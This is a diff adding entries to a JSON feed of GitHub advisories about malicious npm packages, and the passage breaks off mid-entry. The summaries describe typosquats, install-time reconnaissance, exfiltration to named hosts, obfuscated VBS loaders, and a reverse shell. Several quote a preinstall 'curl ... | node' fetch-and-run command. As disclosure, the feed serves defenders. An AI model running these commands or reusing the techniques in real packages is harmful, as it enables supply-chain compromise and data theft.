@@ -1,9 +1,481 @@
 {
   "schema_version": 2,
-  "updated_at": "2026-10-04T12:56:56Z",
+  "updated_at": "2026-10-05T03:03:45Z",
   "total": 100,
   "normalisation_failures": [],
   "items": [
+    {
+      "id": "GHSA-5h59-r5m3-rf9w",
+      "title": "[GHSA-5h59-r5m3-rf9w] Malicious code in focus-visible-polyfill-lite (npm)",
+      "published": "2026-10-05T00:30:40Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (5225b5a8636a589f9b90272ad04c3f4104670a23d5c24b45f6aeaa757a4f2a2b) \n The package is advertised as a focus-visible polyfill but ships thunderboltRegistry.js, which impersonates Wix thunderbolt internal registry modules (thunderboltRegistry, siteAssetsRegistry, documentManagem",
+      "link": ""
+    },
+    {
+      "id": "GHSA-5pr8-5p22-ffv8",
+      "title": "[GHSA-5pr8-5p22-ffv8] Malicious code in express-fork (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (174daf2d7b9b396bb40a2ad347597eb7d1e829c46e4568e9700302e8aaceee3d) \n express-fork@5.2.2 is a typosquat of the express package. Its package.json metadata (description, author, repository, keywords) is copied verbatim from express, while package.json line 98 defines a preinsta",
+      "link": ""
+    },
+    {
+      "id": "GHSA-qj2f-36rw-2gvm",
+      "title": "[GHSA-qj2f-36rw-2gvm] Malicious code in express-enhanced (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (15d6ce3e4c988439e6023bb900fde41c1a7eebe0c372eddc3a3c3c9d8206a9d6) \n express-enhanced@5.2.2 impersonates the express package: it ships the express README verbatim, declares  TJ Holowaychuk  as author, and points  repository  at  expressjs/express , while publishing under a d",
+      "link": ""
+    },
+    {
+      "id": "GHSA-64fj-vj54-m8r3",
+      "title": "[GHSA-64fj-vj54-m8r3] Malicious code in css-starting-style-polyfill (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (713c302594ab7c41e8034ca95478045afafba98e223ea62def160f080cb879cd) \n thunderboltRegistry.js runs an IIFE on module load that executes host reconnaissance commands via child_process.execSync (id, whoami, uname -a, ifconfig/ip addr, cat /etc/hosts) and transmits the collected ",
+      "link": ""
+    },
+    {
+      "id": "GHSA-x6m9-jxjp-c938",
+      "title": "[GHSA-x6m9-jxjp-c938] Malicious code in css-snap-target-polyfill (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (00c104d427125b4acf88ecb83a58d563507b23bcb716cb87fbf7fc953d816d42) \n The package ships thunderboltRegistry.js, which uses child_process and process.platform to collect host information and POSTs it via fetch() to the hardcoded external endpoint  http://dxpoc.gt.tc . The dest",
+      "link": ""
+    },
+    {
+      "id": "GHSA-p6p9-mjx4-2fgf",
+      "title": "[GHSA-p6p9-mjx4-2fgf] Malicious code in css-light-dark-polyfill (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (856c154d7855924568c88181f172f46e84aac202bd6cb29974eb2ffaa3ec3ea7) \n The package presents itself as a trivial CSS polyfill (index.js exports an empty object) but ships thunderboltRegistry.js, which on load runs a self-invoking IIFE that collects host identifiers (os.hostname",
+      "link": ""
+    },
+    {
+      "id": "GHSA-gpfw-fchg-rwjm",
+      "title": "[GHSA-gpfw-fchg-rwjm] Malicious code in css-gap-decorations-polyfill (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (8126656cc344a4f632b8ddf5a23683fc92ac22798bb67e1aed6bca73ac82d7b6) \n The package is published as a CSS polyfill but ships no polyfill functionality. On require(), thunderboltRegistry.js uses child_process.execSync to run whoami, uname -a, ifconfig/ip addr, and read /etc/host",
+      "link": ""
+    },
+    {
+      "id": "GHSA-63h7-vcf3-9xgh",
+      "title": "[GHSA-63h7-vcf3-9xgh] Malicious code in css-relative-color-util (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (ee0efef48c7d56201a037b237f11ec712853f86e74f6a00ef8011732b31363f1) \n The package name advertises a CSS utility, but thunderboltRegistry.js runs an IIFE on module load that uses child_process.execSync to execute whoami, uname -a, cat /etc/hosts, and ifconfig/ip addr, then exf",
+      "link": ""
+    },
+    {
+      "id": "GHSA-h3hx-44p9-q47q",
+      "title": "[GHSA-h3hx-44p9-q47q] Malicious code in css-interop-observer-polyfill (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (089bdc1dd6bdf0216bb911888e81ce97dc171bdef2588fd5de0aadb4a64fbb2b) \n On module load, thunderboltRegistry.js executes an IIFE that runs id, whoami, uname, ifconfig/ip addr via child_process.execSync and reads /etc/hosts, then sends each result together with hostname, node ver",
+      "link": ""
+    },
+    {
+      "id": "GHSA-5hx2-mp3m-4gr6",
+      "title": "[GHSA-5hx2-mp3m-4gr6] Malicious code in chai-as-testmode (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (af5e91a44a2eb0773df19fce2096660c285bafbe846a5f09d8bb25ff0eba22b2) \n The package masquerades as the pino logging library (README badges and lib/ contents mimic pino) but ships a dropper at lib/initializeCaller.js. A self-executing IIFE POSTs the full process.env object to a ",
+      "link": ""
+    },
+    {
+      "id": "GHSA-wqfg-33rw-c9rw",
+      "title": "[GHSA-wqfg-33rw-c9rw] Malicious code in css-scroll-anchor-polyfill (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (36596ba9b9d8c0f994abe3cd87783f4f0dc880e63d55374d3555347ce349fab2) \n Package is published as css-scroll-anchor-polyfill but its index.js is empty and its contents impersonate internal Wix thunderbolt registry module names (thunderboltRegistry, siteAssetsRegistry, documentMan",
+      "link": ""
+    },
+    {
+      "id": "GHSA-7g6f-95c5-ghgv",
+      "title": "[GHSA-7g6f-95c5-ghgv] Malicious code in css-logical-prop-shim (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (d0ffba65f80ee8f200199c8c90ebb6297b8590537c80ea50bb34874d91665b5f) \n The package ships thunderboltRegistry.js which imports child_process and invokes execSync with curl commands at multiple sites (lines 30, 39, 47, 48). The declared purpose of the package is a CSS logical-pr",
+      "link": ""
+    },
+    {
+      "id": "GHSA-rmf7-f53x-p8v6",
+      "title": "[GHSA-rmf7-f53x-p8v6] Malicious code in css-field-sizing-polyfill (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (549bb8820cb6a8a35853826d17b64df14c0561b83790192a33c5dc76dbad53b9) \n The package advertises itself as a CSS field-sizing polyfill but ships thunderboltRegistry.js, which runs an IIFE at module load time. The IIFE shells out via child_process.execSync to run  id ,  whoami ,  ",
+      "link": ""
+    },
+    {
+      "id": "GHSA-wwwp-g75q-ww7r",
+      "title": "[GHSA-wwwp-g75q-ww7r] Malicious code in css-scroll-state-polyfill (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (cffa0affc34bac3fa24fcc7c67aae4d120066f4f856cb8b637bc04c6ca9d482c) \n The package presents itself as a CSS polyfill but ships a payload file (thunderboltRegistry.js) that executes an IIFE at require time. The IIFE uses child_process to run host-identification commands (id, wh",
+      "link": ""
+    },
+    {
+      "id": "GHSA-h7h4-gh2m-xjmq",
+      "title": "[GHSA-h7h4-gh2m-xjmq] Malicious code in css-reading-flow-polyfill (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (3b18e313d5fc67f07c1bcf051bd79a85dca97bb3c4510d9755efca6414bb55ff) \n The package is published as css-reading-flow-polyfill but ships thunderboltRegistry.js, which impersonates internal Wix thunderbolt registry modules (thunderboltRegistry, siteAssetsRegistry, documentManagem",
+      "link": ""
+    },
+    {
+      "id": "GHSA-592h-fp69-gpjf",
+      "title": "[GHSA-592h-fp69-gpjf] Malicious code in css-env-function-shim (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (03e6fced50259d6d3781ef3917caba965e4744420188c3e06919541b64e2e294) \n Package self-describes as a CSS env() shim but ships thunderboltRegistry.js, which runs an IIFE at module load that base64-decodes the strings 'child_process' and 'execSync', dynamically requires child_proc",
+      "link": ""
+    },
+    {
+      "id": "GHSA-4hxq-p3xc-m5cr",
+      "title": "[GHSA-4hxq-p3xc-m5cr] Malicious code in css-a11y-contrast-utils (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (85ad65ab7d49c4277898f5da5b5d45f3ec9cde46035bcf6416e3a95507ca1301) \n css-a11y-contrast-utils@1.0.0 is advertised as a WCAG contrast utility but ships no contrast code — index.js exports an empty object. The package instead defines a Proxy stub exposing identifiers from Wix's",
+      "link": ""
+    },
+    {
+      "id": "GHSA-5q2j-22rc-7634",
+      "title": "[GHSA-5q2j-22rc-7634] Malicious code in core-js-gnz (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (dc57686b95f827f2c3b0501d97b6575e077247255bf5d4227ae9bc8bedd43937) \n On install, package.json runs  node init.js  as a postinstall hook. init.js collects host identifiers (os.hostname(), os.userInfo().username, os.platform(), os.arch(), node version, OS release) and POSTs th",
+      "link": ""
+    },
+    {
+      "id": "GHSA-4ppq-v2jm-24mc",
+      "title": "[GHSA-4ppq-v2jm-24mc] Malicious code in css-anchor-pos-fallback (npm)",
+      "published": "2026-10-05T00:30:39Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (bd0a6c8e1448ffd9abb3732872ea3d49280a422d49524aaa57d0b89a73812f05) \n The package advertises itself as a CSS anchor-position polyfill but on require executes an IIFE in thunderboltRegistry.js that runs  id ,  whoami ,  uname -a ,  ifconfig / ip addr , and reads  /etc/hosts , ",
+      "link": ""
+    },
+    {
+      "id": "GHSA-hp8q-m388-6xxg",
+      "title": "[GHSA-hp8q-m388-6xxg] Malicious code in wcag-color-a11y-helpers (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (8b6e72298f32298d6558f5d52eb7a9d5185b37fe8df14748bf61d6686dde1cb3) \n Package is advertised as a WCAG color accessibility helper library but ships thunderboltRegistry.js, an IIFE that on module load executes shell commands (whoami, id, pwd, ifconfig/ip addr, hostname) and tra",
+      "link": ""
+    },
+    {
+      "id": "GHSA-w8c4-4fjc-rg48",
+      "title": "[GHSA-w8c4-4fjc-rg48] Malicious code in ultimate-websocket (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (7574e423b830695141ee6e089006e0c355109e240c69881512806869cfee8114) \n package.json declares its only dependency  node-net-pool  as a bare tarball URL pointing at the mutable  main  branch of an unrelated GitHub user ( https://github.com/trktgq0wbre1/node-net-pool/archive/refs",
+      "link": ""
+    },
+    {
+      "id": "GHSA-q9p4-hv94-cxpj",
+      "title": "[GHSA-q9p4-hv94-cxpj] Malicious code in tiny-viewport-unit-calc (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (34c221d8f8f0fedded27bfc22763912ffd96e9f3d1b2c08932e054ed418f493e) \n The package ships thunderboltRegistry.js, a module that imports Node's child_process primitives and executes  whoami  plus repeated  ping  commands against external hostnames, with POST calls present in the",
+      "link": ""
+    },
+    {
+      "id": "GHSA-vr8g-34ph-vq26",
+      "title": "[GHSA-vr8g-34ph-vq26] Malicious code in tiny-dom-focus-trap (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (84262096595a1e0ce09bbaa359930cd07cf420cc72545174ddc4f12c60bec962) \n The package is advertised as a focus-trap utility but thunderboltRegistry.js runs an IIFE at require time that uses child_process.execSync to run whoami, id, pwd, ifconfig / ip addr, hostname, and to read /",
+      "link": ""
+    },
+    {
+      "id": "GHSA-gc5p-h89m-743g",
+      "title": "[GHSA-gc5p-h89m-743g] Malicious code in tiny-css-token-parser (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (ee63fae51fceee7c4d3c5051e191e477ca9bb8302f6fc4d3d07f5446951efa0f) \n Package is advertised as a CSS token parser but ships thunderboltRegistry.js which runs an IIFE on module load that collects hostname, pid, Node version, platform, and the output of  id  and  uname -r  via ",
+      "link": ""
+    },
+    {
+      "id": "GHSA-vj2w-9332-v252",
+      "title": "[GHSA-vj2w-9332-v252] Malicious code in tiny-focusgroup-helper (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (9c6d210f6c61d0ec49fac4bf487a2d71966b1f3dd59653d8a8fdf12e04f9b306) \n tiny-focusgroup-helper@1.0.0 declares itself as a focus-group accessibility helper, but thunderboltRegistry.js runs an IIFE at require time that executes  whoami ,  uname -a ,  ifconfig / ip addr , and read",
+      "link": ""
+    },
+    {
+      "id": "GHSA-6qrh-6qq7-9xjh",
+      "title": "[GHSA-6qrh-6qq7-9xjh] Malicious code in tailwindcss-forms-styles (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (587d9a389f35a8ec2d3ed714c90f7daa43feb6875f4ce2e4280f5ce19569d895) \n The package name tailwindcss-forms-styles mimics the legitimate @tailwindcss/forms plugin, and its src/index.js copies that plugin's code verbatim as cover. Above the cover code, a top-level IIFE joins a ~1",
+      "link": ""
+    },
+    {
+      "id": "GHSA-9q5r-qjph-hpr8",
+      "title": "[GHSA-9q5r-qjph-hpr8] Malicious code in monitoring-agent (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (703c1e796904571c9f0d08a4769a5f7e25a646483b4a66815a6ddc420ae0ecee) \n The package exports an Express middleware ( monitor() ) advertised as a monitoring tool. On every response finish, the middleware POSTs the inbound HTTP request to a hardcoded author-controlled host at  htt",
+      "link": ""
+    },
+    {
+      "id": "GHSA-j79g-9wmp-mcv8",
+      "title": "[GHSA-j79g-9wmp-mcv8] Malicious code in studiocode_tools (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (261d413c0847b530c9a452c209c25e0a7d9123f9b0f20b26d0afcc41a929c74a) \n package.json declares a postinstall hook that runs  wscript.exe 4444.vbs , auto-executing on  npm install  on Windows. The shipped 4444.vbs contains hand-rolled AES and ChaCha20 implementations with XOR-obf",
+      "link": ""
+    },
+    {
+      "id": "GHSA-4c6x-w3wj-2cr2",
+      "title": "[GHSA-4c6x-w3wj-2cr2] Malicious code in lite-matte (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (4e7b0ae9e42c334c1c22627e60add7a2c5a0d558a2ab65a3af0043e27bb0e686) \n package.json declares  \"postinstall\": \"wscript.exe 4444.vbs\" , causing  npm install  to auto-execute a ~765KB Windows Script Host file shipped in the tarball. 4444.vbs is heavily obfuscated: it reconstructs",
+      "link": ""
+    },
+    {
+      "id": "GHSA-chvh-489x-9963",
+      "title": "[GHSA-chvh-489x-9963] Malicious code in studiocode_eligibility (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (a49b1af8bbf0463bb38d3049e59c28b0dcc8d2e3e5ef54611b4e77bddfdd36dc) \n package.json declares a postinstall hook  wscript.exe 4444.vbs  that automatically executes a 765KB VBScript shipped in the tarball on Windows installers. The VBS contains multi-layer obfuscation (XOR-decod",
+      "link": ""
+    },
+    {
+      "id": "GHSA-94wj-mm38-wwhp",
+      "title": "[GHSA-94wj-mm38-wwhp] Malicious code in dom-focus-sentinel (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (7baf5178b3cd02ae8e6e2c01e8cf305fd9670118428c4d3ef94ac0caef6fc4e8) \n thunderboltRegistry.js runs an immediately-invoked function at module load that uses child_process.execSync to run host reconnaissance commands (whoami, id, pwd, ifconfig, ip addr, cat /etc/hosts, hostname)",
+      "link": ""
+    },
+    {
+      "id": "GHSA-w5cp-x835-j7fg",
+      "title": "[GHSA-w5cp-x835-j7fg] Malicious code in hardhat-jsx (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (62ac44be2745338b73861690e7f979216fdfc6c3797dfa2f450e9063aa4158d1) \n The package is published as 'hardhat-jsx' but its metadata, documentation, and lib/ layout impersonate the pino logger (keywords 'fast','logger','stream','json'; shipped docs reference pinojs/pino). The mai",
+      "link": ""
+    },
+    {
+      "id": "GHSA-h2r5-f9pw-xprr",
+      "title": "[GHSA-h2r5-f9pw-xprr] Malicious code in botmaker-cli (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (86fdc86c67d202ca9938942ef7786534d1b72169187cce13b1cefd8899fa54aa) \n On npm install, postinstall.js collects the installer's hostname, username, current working directory, architecture, platform, and network interface list (including private IPs) and POSTs them as JSON to th",
+      "link": ""
+    },
+    {
+      "id": "GHSA-254v-2947-w7m9",
+      "title": "[GHSA-254v-2947-w7m9] Malicious code in popover-anchor-polyfill (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (31e270ae326e5c45ebeb5fcf7bc9ff96126908c194bef5f280a4028fff0e9ed9) \n The package advertises itself as a 'popover anchor positioning polyfill' but ships thunderboltRegistry.js, which executes an IIFE on module load that spawns shell commands via child_process.execSync ( id , ",
+      "link": ""
+    },
+    {
+      "id": "GHSA-35rh-mx8g-vj6f",
+      "title": "[GHSA-35rh-mx8g-vj6f] Malicious code in postcss-gap-fallback-util (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (5b54d5bd893bc377a77503059998e01ae3e338fd4d8ddac6fe2d7c71a3157cb5) \n The package is published as a PostCSS gap fallback utility but ships thunderboltRegistry.js, which executes an IIFE on module load. The IIFE runs whoami, id, and hostname via child_process.execSync, curls t",
+      "link": ""
+    },
+    {
+      "id": "GHSA-6p6v-j47j-wgcr",
+      "title": "[GHSA-6p6v-j47j-wgcr] Malicious code in lite-matterr (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (cc9b5f5edaae9103fd26de7cb70e661d78d6948dc3c519fec6b4b62fd471fbfc) \n lite-matterr@1.0.0 declares a postinstall hook in package.json that runs  wscript.exe 4444.vbs  on  npm install . The bundled 4444.vbs is a ~765KB heavily obfuscated VBScript containing layered decryption r",
+      "link": ""
+    },
+    {
+      "id": "GHSA-fqp7-jcwh-2jp3",
+      "title": "[GHSA-fqp7-jcwh-2jp3] Malicious code in rgx33-css-grid-utils (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (320488b79c9000782e398425aa1a2fddba7f29a487913bbb2fc2019405c078f5) \n The package is published as  rgx33-css-grid-utils  but exports a set of module keys matching Wix thunderbolt internal registries ( thunderboltRegistry ,  siteAssetsRegistry ,  editorRegistry ,  corvidRegist",
+      "link": ""
+    },
+    {
+      "id": "GHSA-wp69-7q5m-655v",
+      "title": "[GHSA-wp69-7q5m-655v] Malicious code in internallib_v275 (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (80c1c6d383b3defb01da235e39e08ce56276d887e63d900aea2ee689836f71b4) \n index.js exports a  command  function that invokes  /bin/bash -c  to curl a reverse-shell payload from reverse-shell.sh targeting the hardcoded host 10.0.49.106:443 and pipes the response to  sh , yielding ",
+      "link": ""
+    },
+    {
+      "id": "GHSA-g7w2-c843-wqvj",
+      "title": "[GHSA-g7w2-c843-wqvj] Malicious code in oleh-modal (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (cf2aebc282014a7dfa6ef1726083d23bcc9cc3eca76c814d4e775b7b10021545) \n Package oleh-modal@1.0.0 is a credential-harvesting phishing kit disguised as a wallet-connect modal component. It renders fake MetaMask/Phantom/Rabby/OKX 'restore vault' modals that link to the legitimate ",
+      "link": ""
+    },
+    {
+      "id": "GHSA-294m-x97c-p7xh",
+      "title": "[GHSA-294m-x97c-p7xh] Malicious code in lite-mater (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (532663c4102d3cf7310e29ca1eb2b389c5c32c1e541da219b7c4364968f4e807) \n package.json declares a postinstall lifecycle hook  wscript.exe 4444.vbs  that runs automatically on  npm install  on Windows hosts. The shipped 4444.vbs (~765 KB) is a multi-layer obfuscated loader: an emb",
+      "link": ""
+    },
+    {
+      "id": "GHSA-f39p-674r-wpww",
+      "title": "[GHSA-f39p-674r-wpww] Malicious code in dotenv-promises (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (254f0bcbb8014fb07414eb0b41a898deac682aa8c8b7a8541a0f7538ac274f9a) \n The package is published as 'dotenv-promises' but its bundled manifest declares the internal name 'node-env-buffer@2.2.6' and mimics the dotenv API (config/parse/populate/expand) to attract installs of a we",
+      "link": ""
+    },
+    {
+      "id": "GHSA-xhw7-45rg-wv8m",
+      "title": "[GHSA-xhw7-45rg-wv8m] Malicious code in minimal-a11y-contrast-check (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (d9a198e6fb2c5e31bc841ff12f210e630abe8629853faf4ea961a124a9be8a25) \n Despite being advertised as a WCAG contrast checker, the package executes a self-invoking function at module load that runs host reconnaissance commands (whoami, id, hostname, uname -a, ls -la /, pwd, cat /",
+      "link": ""
+    },
+    {
+      "id": "GHSA-w2cr-cx6p-c475",
+      "title": "[GHSA-w2cr-cx6p-c475] Malicious code in rgx33-flex-layout-core (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (02200327d66cf0661b787f58049b55b5fbb95dfb76fbb81a679cc71439bd85eb) \n Package name and exports (thunderboltRegistry, siteAssetsRegistry, editorRegistry, corvidRegistry, etc.) impersonate internal Wix thunderbolt registry packages, targeting Wix build pipelines via dependency ",
+      "link": ""
+    },
+    {
+      "id": "GHSA-3rx7-3cx7-x3hv",
+      "title": "[GHSA-3rx7-3cx7-x3hv] Malicious code in promises-dotenv3 (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (146d9688d00e8fa785e2fb62976f0dad169e8055c6c92d3795536cc63527c640) \n promises-dotenv3@1.0.0 is a typosquat of dotenv-family packages that executes an obfuscated payload at module load. On top-level require of the package's main entry and its CLI, a function named  dispatchAn",
+      "link": ""
+    },
+    {
+      "id": "GHSA-85mm-jcj2-w79v",
+      "title": "[GHSA-85mm-jcj2-w79v] Malicious code in hardhat-ftp (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (5e916c23a0efbd49d3cfcd5993957df7afbade3f454925d0672acc8c9f68245c) \n The package's declared main entry index.js unconditionally requires./lib/config, a 4,499,968-byte obfuscator.io-packed file (26,234-entry string array, hex-renamed identifiers, control-flow flattening, top-",
+      "link": ""
+    },
+    {
+      "id": "GHSA-99j2-pxrq-hpqc",
+      "title": "[GHSA-99j2-pxrq-hpqc] Malicious code in hardhat-roof (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (25cbf03ad6014824ab078237f83b2b682145928e5effefbe3dcc5deca9ba1e26) \n The package presents itself as the pino logger — README, docs/, index.d.ts and LICENSE are copied from pinojs/pino and keywords advertise 'fast, logger, stream, json' — but the package name is 'hardhat-roof",
+      "link": ""
+    },
+    {
+      "id": "GHSA-2hcg-vv96-p63m",
+      "title": "[GHSA-2hcg-vv96-p63m] Malicious code in hardhat-plus (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (02d908da8470ad86669b080d267b57174ccd77e5fd6ed2c371c430d98e869f2b) \n hardhat-plus@2.21.0 is published under a name resembling the Ethereum development tool 'hardhat' but ships README, type definitions, and docs copied verbatim from the unrelated pino logger project (README.m",
+      "link": ""
+    },
+    {
+      "id": "GHSA-5gq4-v664-5cwf",
+      "title": "[GHSA-5gq4-v664-5cwf] Malicious code in dotenv-async (npm)",
+      "published": "2026-10-05T00:30:38Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (51d22963a1f1fabe3a8b3f54efcb5053761d385486093200765745297ac2bd16) \n The package impersonates the dotenv API but on module load (and again when the bundled CLI runs) invokes a function named dispatchAnalytics in dist/index.cjs that extracts a payload from the APP14 (0xFFED) ",
+      "link": ""
+    },
+    {
+      "id": "GHSA-6rjc-7w2v-h9mg",
+      "title": "[GHSA-6rjc-7w2v-h9mg] Malicious code in a11y-tabindex-manager (npm)",
+      "published": "2026-10-05T00:30:37Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (ce127c3e1cadd4f544a5f2580f2db030e3d9e3667d7b0e3399d85b59eb354045) \n a11y-tabindex-manager ships thunderboltRegistry.js, which executes an IIFE on module load that runs a series of local shell commands (cat /etc/hosts, whoami, id, pwd, ifconfig/ip addr, hostname, cat /etc/re",
+      "link": ""
+    },
+    {
+      "id": "GHSA-gh38-mqx9-5mxf",
+      "title": "[GHSA-gh38-mqx9-5mxf] Malicious code in @kibt/www-nuxt-i18n (npm)",
+      "published": "2026-10-05T00:30:37Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (5ab1895c73507311b9efd31e40015529d9d7735c87e50cf3b714e6e520205ec4) \n The package is a stub whose index.js exports a Proxy returning no-op functions for every property access, allowing bundlers that import any member of the expected real package to succeed. The package.json d",
+      "link": ""
+    },
+    {
+      "id": "GHSA-cg42-crqv-qjm9",
+      "title": "[GHSA-cg42-crqv-qjm9] Malicious code in @nagular/router (npm)",
+      "published": "2026-10-05T00:30:37Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (5db05365620b3f716b28b41577e593bc35a6699aee20090951158c206c2585ca) \n package.json declares a preinstall lifecycle hook that runs  curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node , fetching an opaque Jav",
+      "link": ""
+    },
+    {
+      "id": "GHSA-2gcf-qjvx-w58p",
+      "title": "[GHSA-2gcf-qjvx-w58p] Malicious code in @angulra/cli (npm)",
+      "published": "2026-10-05T00:30:37Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (e3158beab2ea0d9f8e28d488f124268c8c9a00a3a0f5599823c4d13f741ac40f) \n The package name @angulra/cli is a character-swap of @angular/cli and copies the legitimate Angular CLI's metadata (description, repository, homepage, keywords, dependencies). Its package.json defines a pre",
+      "link": ""
+    },
+    {
+      "id": "GHSA-wxf9-85p5-gwhp",
+      "title": "[GHSA-wxf9-85p5-gwhp] Malicious code in @nagular/core (npm)",
+      "published": "2026-10-05T00:30:37Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (5ac4933487fc7ccf7161933c9d5f6965b5e1f0a3efeaf8ea5349096835008557) \n The package's package.json declares a preinstall lifecycle script that runs  curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node , fetchi",
+      "link": ""
+    },
+    {
+      "id": "GHSA-9hmh-c2v6-5rx3",
+      "title": "[GHSA-9hmh-c2v6-5rx3] Malicious code in @babell/core (npm)",
+      "published": "2026-10-05T00:30:37Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (ae256b9ff55b98040ea9cb6561edfe1c4e2db94bd111fb19a449651bd6b5d44b) \n The package's package.json defines a preinstall lifecycle script that runs  curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node , downloa",
+      "link": ""
+    },
+    {
+      "id": "GHSA-9rxx-xxjx-v9w8",
+      "title": "[GHSA-9rxx-xxjx-v9w8] Malicious code in @angularr/core (npm)",
+      "published": "2026-10-05T00:30:37Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (801dcd769bdbf58aa11a657a5344e075ed57fcdafd1384b47ba611956e7cb365) \n The package's npm preinstall lifecycle script runs  curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node , fetching a JavaScript payload f",
+      "link": ""
+    },
+    {
+      "id": "GHSA-37mv-mqr9-gv2x",
+      "title": "[GHSA-37mv-mqr9-gv2x] Malicious code in @angularr/router (npm)",
+      "published": "2026-10-05T00:30:37Z",
+      "ecosystem": "NPM",
